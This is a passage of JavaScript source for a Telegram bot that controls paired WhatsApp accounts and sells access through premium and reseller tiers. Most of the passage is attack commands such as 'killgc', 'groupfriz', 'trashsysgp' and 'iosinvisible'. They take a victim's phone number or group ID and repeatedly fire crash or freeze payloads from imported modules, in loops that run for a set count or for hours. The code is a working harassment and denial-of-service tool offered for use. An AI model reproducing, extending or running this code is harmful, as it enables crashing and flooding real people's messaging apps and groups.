                return S7.sendMessage(chatId, `❌ Usage: /${s7CM} +92020065715 1`);
            }

            const cleanTarget = args[1].replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget}`);
                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });

                const delayMs = 2000;

                if (args[2] === 'only') {
                    const count = parseInt(args[3]);
                    if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
                    
                    for (let i = 0; i < count; i++) {
                        await crashjamLogic.crashjam(client, targetJid);
                        await new Promise(res => setTimeout(res, delayMs));
                    }
                } else {
                    const hours = parseInt(args[2]);
                    if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time');
                    
                    const endTime = Date.now() + hours * 60 * 60 * 1000;
                    while (Date.now() < endTime) {
                        await crashjamLogic.crashjam(client, targetJid);
                        await new Promise(res => setTimeout(res, delayMs));
                    }
                }
            } catch (err) {
                log('error', s7CM, err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });

        // ==================== NEW GROUP BUG COMMANDS FROM YOUR SCRIPT ====================

        SYLoVe(['killgc', 'groupfriz'], async (msg) => {
            try {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');
                const s7CM = args[0].slice(1);
                const targetNum = args[1];
                const durationArg = args[2];

                if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

                const session = GetSessionForUser(userId, chatId);
                if (session.error) return S7.sendMessage(chatId, session.error);
                const client = session.sock;

                if (!targetNum || !targetNum.endsWith('@g.us')) {
                    return S7.sendMessage(chatId, `❌ Provide a valid group JID.\nExample: /${s7CM} 123456@g.us 1`);
                }
                
                if (!durationArg) {
                    return S7.sendMessage(chatId, `❌ Provide duration in hours.\nExample: /${s7CM} 123456@g.us 1`);
                }
                
                const hours = parseInt(durationArg);
                if (isNaN(hours) || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid duration');

                const targetJid = targetNum.trim();

                log('command', msg.from.first_name, `Calling ${s7CM} on ${targetJid} for ${hours}h`);
                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(targetJid), parse_mode: 'HTML' });

                const delayMs = 2000;
                const endTime = Date.now() + hours * 60 * 60 * 1000;

                while (Date.now() < endTime) {
                    await gcFrzLogic.gcFrz(client, targetJid);
                    await new Promise(res => setTimeout(res, delayMs));
                }

            } catch (err) {
                log('error', s7CM, err.message);
                await S7.sendMessage(msg.chat.id, `❌ Error: ${err.message}`);
            }
        });

        SYLoVe('trashsysgp', async (msg) => {
            try {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');
                const s7CM = args[0].slice(1);
                const targetNum = args[1];
                const durationArg = args[2];

                if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

                const session = GetSessionForUser(userId, chatId);
                if (session.error) return S7.sendMessage(chatId, session.error);
                const client = session.sock;

                if (!targetNum || !targetNum.endsWith('@g.us')) {
                    return S7.sendMessage(chatId, `❌ Provide a valid group JID.\nExample: /${s7CM} 123456@g.us 1`);
                }
                
                if (!durationArg) {
                    return S7.sendMessage(chatId, `❌ Provide duration in hours.\nExample: /${s7CM} 123456@g.us 1`);
                }
                
                const hours = parseInt(durationArg);
                if (isNaN(hours) || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid duration');

                const targetJid = targetNum.trim();

                log('command', msg.from.first_name, `Calling ${s7CM} on ${targetJid} for ${hours}h`);
                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(targetJid), parse_mode: 'HTML' });

                const delayMs = 2000;
                const endTime = Date.now() + hours * 60 * 60 * 1000;

                while (Date.now() < endTime) {
                    await killsystemLogic.killsystem(client, targetJid);
                    await gcFrzLogic.gcFrz(client, targetJid);
                    await new Promise(res => setTimeout(res, delayMs));
                }

            } catch (err) {
                log('error', s7CM, err.message);
                await S7.sendMessage(msg.chat.id, `❌ Error: ${err.message}`);
            }
        });

        // ==================== EXISTING iOS BUG COMMANDS ====================

        SYLoVe(['iosinvisible', 'iosvisible'], async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const cmd = args[0].slice(1);

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

            const session = GetSessionForUser(userId, chatId);
            if (session.error) return S7.sendMessage(chatId, session.error);
            const client = session.sock;

            if (args.length < 3) {
                return S7.sendMessage(chatId, `❌ Usage: /${cmd} +92020065715 1`);
            }

            const cleanTarget = args[1].replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                log('command', msg.from.first_name, `Calling ${cmd} on ${cleanTarget}`);
                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });

                const delayFn = ms => new Promise(res => setTimeout(res, ms));

                if (args[2] === 'only') {
                    const count = parseInt(args[3]);
                    if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
                    for (let i = 0; i < count; i++) {
                        await IosLogic.IosInvisible(client, targetJid);
                        await delayFn(500);
                    }
                } else {
                    const hours = parseInt(args[2]);
                    if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time');
                    const endTime = Date.now() + hours * 60 * 60 * 1000;
                    while (Date.now() < endTime) {
                        await IosLogic.IosInvisible(client, targetJid);
                        await delayFn(500);
                    }
                }
            } catch (err) {
                log('error', cmd, err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });

        SYLoVe('hidenseek', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

            const session = GetSessionForUser(userId, chatId);
            if (session.error) return S7.sendMessage(chatId, session.error);
            const client = session.sock;

            if (args.length < 3) {
                return S7.sendMessage(chatId, `❌ Usage: /hidenseek +92020065715 1`);
            }

            const cleanTarget = args[1].replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                log('command', msg.from.first_name, `Calling hidenseek on ${cleanTarget}`);
                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });

                const delayFn = ms => new Promise(res => setTimeout(res, ms));

                if (args[2] === 'only') {
                    const count = parseInt(args[3]);
                    if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
                    for (let i = 0; i < count; i++) {
                        await IosLogic.IosInvisible(client, targetJid);
                        await delayFn(500);
                    }
                } else {
                    const hours = parseInt(args[2]);
                    if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time');
                    const endTime = Date.now() + hours * 60 * 60 * 1000;
                    while (Date.now() < endTime) {
                        await IosLogic.IosInvisible(client, targetJid);
                        await delayFn(500);
                    }
                }
            } catch (err) {
                log('error', 'hidenseek', err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });

        // ==================== EXISTING GROUP BUG COMMANDS ====================

        SYLoVe(['nullgc', 'xgroup', 'groupfinity', 'autoclosegc', 'groupui', 'groupmix', 'forcegroup'], async (msg) => {
            try {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');
                const cmd = args[0].slice(1);
                const targetJid = args[1];
                const durationArg = args[2];

                if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

                const session = GetSessionForUser(userId, chatId);
                if (session.error) return S7.sendMessage(chatId, session.error);
                const client = session.sock;

                if (!targetJid || !targetJid.endsWith('@g.us')) {
                    return S7.sendMessage(chatId, `❌ Provide a valid group JID.\nExample: /${cmd} 123456@g.us 1`);
                }
                if (!durationArg) {
                    return S7.sendMessage(chatId, `❌ Provide duration in hours.\nExample: /${cmd} 123456@g.us 1`);
                }
                const hours = parseInt(durationArg);
                if (isNaN(hours) || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid duration');

                log('command', msg.from.first_name, `Calling ${cmd} on ${targetJid} for ${hours}h`);
                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(targetJid), parse_mode: 'HTML' });

                const delayFn = ms => new Promise(res => setTimeout(res, ms));
                const endTime = Date.now() + hours * 60 * 60 * 1000;

                while (Date.now() < endTime) {
                    await XgcLogic.Xgc(client, targetJid);
                    await delayFn(2000);
                }
            } catch (err) {
                log('error', 'groupcmds', err.message);
                S7.sendMessage(msg.chat.id, `❌ Error: ${err.message}`);
            }
        });

        SYLoVe('listgc', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();

            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            if (!waSessions || Object.keys(waSessions).length === 0) {
                return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
            }

            let text = `⬣ <b>LIST OF WHATSAPP GROUPS</b>\n\n`;
            let totalGroups = 0;
            let index = 1;

            for (const chatKey of Object.keys(waSessions)) {
                for (const session of waSessions[chatKey]) {
                    const sock = session.sock;
                    const num = session.num;

                    try {
                        const groupsObj = await sock.groupFetchAllParticipating();
                        const groups = Object.values(groupsObj);

                        if (groups.length === 0) continue;

                        text += `📱 <b>Number:</b> <code>${num}</code>\n`;
                        text += `━━━━━━━━━━━━━━━\n`;

                        for (const group of groups) {
                            const meta = await sock.groupMetadata(group.id);

                            text += `❏ Group ${index++}\n`;
                            text += `│⭔ <b>Name:</b> ${meta.subject}\n`;
                            text += `│⭔ <b>ID:</b> <code>${meta.id}</code>\n`;
                            text += `│⭔ <b>Members:</b> ${meta.participants.length}\n`;
                            text += `╰──────────────\n\n`;

                            totalGroups++;
                        }
                    } catch (err) {
                        log('error', 'LISTGC', `Failed for ${num}: ${err.message}`);
                    }
                }
            }

            if (totalGroups === 0) {
                return S7.sendMessage(chatId, '❌ No groups found on connected numbers.');
            }

            text =
                `⬣ <b>LIST OF GROUP BELOW</b>\n\n` +
                `📦 <b>Total Groups:</b> ${totalGroups}\n\n` +
                text;

            if (text.length > 4000) {
                const filePath = './Love/listgc.txt';
                fs.writeFileSync(filePath, text.replace(/<[^>]*>/g, ''));
                return S7.sendDocument(chatId, filePath);
            }

            S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
        });

        SYLoVe('groupid', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const link = args[1];

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

            const session = GetSessionForUser(userId, chatId);
            if (session.error) return S7.sendMessage(chatId, session.error);
            const client = session.sock;

            if (!link || !link.includes('chat.whatsapp.com/')) {
                return S7.sendMessage(chatId, `❌ Usage: /groupid [Group Link]\nExample: /groupid https://chat.whatsapp.com/Kzj...`);
            }

            try {
                const code = link.split('chat.whatsapp.com/')[1].trim();
                await S7.sendMessage(chatId, '🔍 <b>Scanning Link...</b>', { parse_mode: 'HTML' });
                const groupInfo = await client.groupGetInviteInfo(code);
                const text = 
                    `🆔 <b>GROUP ID FOUND</b>\n` +
                    `────────────────────\n` +
                    `📌 <b>Name:</b> ${groupInfo.subject}\n` +
                    `🔑 <b>ID:</b> <code>${groupInfo.id}</code>\n` +
                    `👑 <b>Owner:</b> <code>${groupInfo.owner || 'Unknown'}</code>\n` +
                    `👥 <b>Size:</b> ${groupInfo.size || 'Unknown'}\n` +
                    `────────────────────\n` +
                    `<i>Click the ID to copy</i>`;
                await S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
            } catch (err) {
                log('error', 'groupid', err.message);
                S7.sendMessage(chatId, `❌ <b>Invalid or Revoked Link</b>\nError: ${err.message}`, { parse_mode: 'HTML' });
            }
        });

        // ==================== EXISTING MISC COMMANDS ====================

        SYLoVe('addtoken', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const newToken = args[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!newToken) return S7.sendMessage(chatId, 'Usage: /addtoken <token>');
            let db = getDB();
            if (db.tokens.find(t => t.token === newToken)) return S7.sendMessage(chatId, '❌ Token already connected.');
            const myBotsCount = db.tokens.filter(t => t.owner === userId).length;
            if (myBotsCount >= 5) return S7.sendMessage(chatId, '🚫 Bot limit reached!\n\nYou can only add <b>5 bots maximum</b>.', { parse_mode: 'HTML' });
            try {
                const tempBot = new SY(newToken, { polling: false });
                const botInfo = await tempBot.getMe();
                db.tokens.push({ token: newToken, owner: userId });
                saveDB(db);
                startSYloveBot(newToken);
                S7.sendMessage(chatId, `✅ Token Connected\nBot: ${botInfo.first_name}\n@${botInfo.username}`);
            } catch (e) {
                S7.sendMessage(chatId, '❌ Invalid token.');
            }
        });

        SYLoVe('reqpair', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const number = args[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!number) return S7.sendMessage(chatId, '❌ Provide a phone number.\nExample: /reqpair +92020065715');
            const cleanNumber = number.replace(/[^0-9]/g, '');
            await StartLovingSY(chatId, cleanNumber, S7);
        });

        SYLoVe('delpair', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const number = args[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!number) return S7.sendMessage(chatId, '❌ Provide a phone number.\nExample: /delpair +92020065715');
            const cleanNumber = number.replace(/[^0-9]/g, '');
            const SYPaTH = `./Love/auth/${chatId}/${cleanNumber}`;
            if (fs.existsSync(SYPaTH)) {
                try {
                    fs.rmSync(SYPaTH, { recursive: true, force: true });
                    S7.sendMessage(chatId, `🗑️ Session deleted successfully for <b>${cleanNumber}</b>.`, { parse_mode: 'HTML' });
                } catch (err) {
                    S7.sendMessage(chatId, `❌ Failed to delete session: ${err.message}`);
                }
            } else {
                S7.sendMessage(chatId, `⚠️ No session found for <b>${cleanNumber}</b>.`, { parse_mode: 'HTML' });
            }
        });

        SYLoVe('deltoken', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const delToken = args[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!delToken) return S7.sendMessage(chatId, 'Usage: /deltoken <token>');
            let db = getDB();
            const tokenObj = db.tokens.find(t => t.token === delToken);
            if (!tokenObj || tokenObj.owner !== userId) return S7.sendMessage(chatId, '❌ No connected token found.');
            db.tokens = db.tokens.filter(t => t.token !== delToken);
            saveDB(db);
            if (activeBots[delToken]) {
                await activeBots[delToken].stopPolling();
                delete activeBots[delToken];
            }
            log('info', `Token deleted: ${delToken.substring(0, 10)}...`);
            S7.sendMessage(chatId, '✅ Token deleted successfully.');
        });

        SYLoVe('mytoken', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id.toString();
            let db = getDB();
            const myTokens = db.tokens.filter(t => t.owner === userId);
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (myTokens.length === 0) return S7.sendMessage(chatId, '❌ You have not added any tokens.');
            let text = '<b>Your Connected Bots</b>\n────────────────────\n\n';
            let count = 1;
            for (const item of myTokens) {
                try {
                    const bot = new SY(item.token, { polling: false });
                    const info = await bot.getMe();
                    text += `<b>${count}. ${info.first_name}</b>\n👤 Username: <b>@${info.username}</b>\n🔑 Token:\n<code>${item.token}</code>\n────────────────────\n\n`;
                } catch {
                    text += `<b>${count}. ⚠️ Unknown Bot</b>\n🔑 Token:\n<code>${item.token}</code>\n────────────────────\n\n`;
                }
                count++;
            }
            S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
        });

        SYLoVe('addresell', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /addresell ID');
            let db = getDB();
            if (db.resellers.includes(targetId)) return S7.sendMessage(chatId, 'User is already a Reseller.');
            db.resellers.push(targetId);
            saveDB(db);
            S7.sendMessage(chatId, `✅ ID ${targetId} added as Reseller.`);
        });

        SYLoVe('delresell', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /delresell ID');
            let db = getDB();
            if (!db.resellers.includes(targetId)) return S7.sendMessage(chatId, 'User is not a Reseller.');
            db.resellers = db.resellers.filter(id => id !== targetId);
            saveDB(db);
            S7.sendMessage(chatId, `✅ ID ${targetId} removed from Resellers.`);
        });

        SYLoVe('listresell', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
            let db = getDB();
            if (db.resellers.length === 0) return S7.sendMessage(chatId, 'No resellers found.');
            let text = 'Reseller List:\n\n';
            for (let i = 0; i < db.resellers.length; i++) {
                const id = db.resellers[i].toString();
                try {
                    const user = await S7.getChat(id);
                    const username = user.username ? `@${user.username} : ` : '';
                    text += `${i + 1}. ${username}<code>${id}</code>\n`;
                } catch {
                    text += `${i + 1}. \`${id}\`\n`;
                }
            }
            text += '\n──────────────────';
            S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
        });

        SYLoVe('broadcast', async (msg) => {
            const chatId = msg.chat.id.toString();
            if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
            const userFile = path.join(LoveDir, 'user.json');
            if (!fs.existsSync(userFile)) return S7.sendMessage(chatId, '❌ No user database found. Wait for users to /start the bot.');
            const users = JSON.parse(fs.readFileSync(userFile));
            if (users.length === 0) return S7.sendMessage(chatId, '❌ No users found in database.');
            const args = msg.text.split(' ').slice(1).join(' ');
            const replyMsg = msg.reply_to_message;
            if (!args && !replyMsg) {
                return S7.sendMessage(chatId, '<b>Usage:</b>\n1. <code>/broadcast Your Message</code>\n2. Reply to an image/video with <code>/broadcast</code>', { parse_mode: 'HTML' });
            }
            const statusMsg = await S7.sendMessage(chatId, `📣 <b>Starting Broadcast...</b>\n\n👥 Target Users: ${users.length}`, { parse_mode: 'HTML' });
            let success = 0, failed = 0;
            for (const user of users) {
                try {
                    if (replyMsg) await S7.copyMessage(user.id, chatId, replyMsg.message_id);
                    else await S7.sendMessage(user.id, args, { parse_mode: 'HTML' });
                    success++;
                } catch { failed++; }
                await new Promise(resolve => setTimeout(resolve, 50));
            }
            await S7.editMessageText(`✅ <b>Broadcast Completed</b>\n\n👥 Total Users: <code>${users.length}</code>\n📨 Success: <code>${success}</code>\n🚫 Failed/Blocked: <code>${failed}</code>`, {
                chat_id: chatId,
                message_id: statusMsg.message_id,
                parse_mode: 'HTML'
            });
        });

        SYLoVe('addprem', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            let db = getDB();
            const isOwner = chatId === config.adminId;
            const isReseller = db.resellers.includes(chatId);
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!isOwner && !isReseller) return S7.sendMessage(chatId, unauthorized);
            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /addprem ID');
            if (db.premium.includes(targetId)) return S7.sendMessage(chatId, 'User is already Premium.');
            db.premium.push(targetId);
            saveDB(db);
            S7.sendMessage(chatId, `⭐ ID ${targetId} added to Premium.`);
        });

        SYLoVe('delprem', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            let db = getDB();
            const isOwner = chatId === config.adminId;
            const isReseller = db.resellers.includes(chatId);
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!isOwner && !isReseller) return S7.sendMessage(chatId, unauthorized);
            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /delprem ID');
            if (!db.premium.includes(targetId)) return S7.sendMessage(chatId, 'User is not Premium.');
            db.premium = db.premium.filter(id => id !== targetId);
            saveDB(db);
            S7.sendMessage(chatId, `🗑️ ID ${targetId} removed from Premium.`);
        });

        SYLoVe('listprem', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
            let db = getDB();
            if (db.premium.length === 0) return S7.sendMessage(chatId, 'No premium users found.');
            let text = 'Premium List:\n\n';
            for (let i = 0; i < db.premium.length; i++) {
                const id = db.premium[i].toString();
                try {
                    const user = await S7.getChat(id);
                    const username = user.username ? `@${user.username} : ` : '';
                    text += `${i + 1}. ${username}<code>${id}</code>\n`;
                } catch {
                    text += `${i + 1}. \`${id}\`\n`;
                }
            }
            text += '\n──────────────────';
            S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
        });

        SYLoVe('state', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const value = args[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
            if (value !== '0' && value !== '1') return S7.sendMessage(chatId, 'Usage: /state 0 | 1');
            let db = getDB();
            db.state = Number(value);
            saveDB(db);
            S7.sendMessage(chatId, value === '0' ? '✅ State set to FREE MODE (All users allowed)' : '🔒 State set to PREMIUM ONLY MODE');
        });

        SYLoVe('listuser', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (msg.chat.id.toString() !== config.adminId) return S7.sendMessage(msg.chat.id, unauthorized);
            const userFile = path.join(LoveDir, 'user.json');
            if (!fs.existsSync(userFile)) return S7.sendMessage(msg.chat.id, 'No users found.');
            const users = JSON.parse(fs.readFileSync(userFile));
            let list = 'User List:\n\n';
            users.forEach((u, i) => { list += `${i + 1}. ${u.name} (${u.id})\n`; });
            if (list.length > 4000) {
                const listPath = path.join(LoveDir, 'list.txt');
                fs.writeFileSync(listPath, list);
                S7.sendDocument(msg.chat.id, listPath);
            } else {
                S7.sendMessage(msg.chat.id, list);
            }
        });

    } catch (err) {
        log('error', 'STARTUP', `Could not start bot with token: ${token.substring(0, 10)}...`);
    }
}

// Start Bot
startSYloveBot(config.mainToken);

// Start Extra Bots
const db = getDB();
if (db.tokens && db.tokens.length > 0) {
    db.tokens.forEach(obj => startSYloveBot(obj.token));
} else {
    log('info', null, 'No extra bots found in database.');
}